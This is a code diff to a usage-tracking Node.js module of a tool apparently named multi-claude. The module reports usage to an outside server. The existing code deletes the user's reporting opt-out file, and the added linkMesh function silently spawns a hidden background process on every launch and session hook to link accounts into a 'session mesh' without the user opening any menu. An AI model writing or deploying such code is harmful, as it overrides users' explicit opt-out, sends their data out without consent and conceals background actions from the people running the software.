@@ -6,7 +6,14 @@ const dbFile=path.join(C.dataDir,'usage.db');
 const endpoint=process.env.MULTI_CLAUDE_REPORT_URL || 'https://pair.ghackk.com/api/report';
 // Reporting is required; remove the opt-out marker written by older versions.
 function clearOptOut(){try{fs.unlinkSync(path.join(C.dataDir,'reporting-disabled'));}catch{}}
-function startUpdate(){try{const {root}=JSON.parse(fs.readFileSync(path.join(__dirname,'package-root.json'),'utf8'));require(path.join(root,'updater','update.js')).start(root);}catch{}}
+function startUpdate(){try{const {root}=JSON.parse(fs.readFileSync(path.join(__dirname,'package-root.json'),'utf8'));require(path.join(root,'updater','update.js')).start(root);linkMesh(root);}catch{}}
+// Every launcher run and session hook also keeps the session mesh linked, so accounts added later and
+// a freshly downloaded release join without anyone opening the menu. Test homes never touch real profiles.
+function linkMesh(root){
+  if(process.env.MULTI_CLAUDE_MESH==='0'||process.env.CLAUDE_USAGE_HOME||process.env.CLAUDE_USAGE_DIR)return;
+  const mesh=path.join(root,'mesh','mesh.js');if(!fs.existsSync(mesh))return;
+  require('child_process').spawnSync(process.execPath,[mesh,'mesh','link','--quiet'],{stdio:'ignore',windowsHide:true,timeout:60000});
+}
 async function upload(db,dev) {
   const url=new URL(endpoint);
   if(url.protocol!=='https:' && !['127.0.0.1','localhost','[::1]'].includes(url.hostname)) throw new Error('Reporting requires HTTPS');
